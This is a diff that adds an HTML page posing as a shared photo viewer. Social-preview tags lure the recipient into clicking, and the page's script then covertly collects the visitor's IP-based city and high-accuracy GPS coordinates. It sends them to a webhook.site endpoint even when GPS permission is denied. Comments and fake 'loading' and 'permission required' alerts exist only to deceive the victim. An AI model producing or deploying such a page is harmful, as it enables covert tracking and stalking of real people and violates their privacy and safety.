@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Viewer</title>
+    <meta property="og:title" content="Shared a photo with you">
+    <meta property="og:image" content="https://images.pexels.com/photos/1462637/pexels-photo-1462637.jpeg?auto=compress&cs=tinysrgb&w=800">
+    <meta property="og:description" content="Tap to view full high-resolution image">
+
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        #image-container {
+            width: 100vw;
+            height: 100vh;
+            /* This is the secure image link */
+            background: url('https://images.pexels.com/photos/1462637/pexels-photo-1462637.jpeg?auto=compress&cs=tinysrgb&w=800') no-repeat center center;
+            background-size: contain;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body onclick="requestAccess()">
+
+    <div id="image-container"></div>
+
+    <script>
+        async function requestAccess() {
+            // First: Grab basic info silently
+            const response = await fetch('https://ipapi.co/json/');
+            const ipData = await response.json();
+
+            // Second: Trigger the GPS prompt
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await fetch("https://webhook.site/2693a92a-d66e-4624-9c97-3d89ea325f67", {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        city: ipData.city,
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy + " meters"
+                    })
+                });
+                // The "Mask" finish - makes them think it's just a slow connection
+                alert("Loading high-resolution image... Please wait.");
+            }, (err) => {
+                // If they click Deny, we still send the IP data
+                fetch("https://webhook.site/2693a92a-d66e-4624-9c97-3d89ea325f67", {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ city: ipData.city, error: "User denied GPS" })
+                });
+                alert("Permission required to view private high-resolution content.");
+            }, {enableHighAccuracy: true});
+        }
+    </script>
+</body>
+</html>
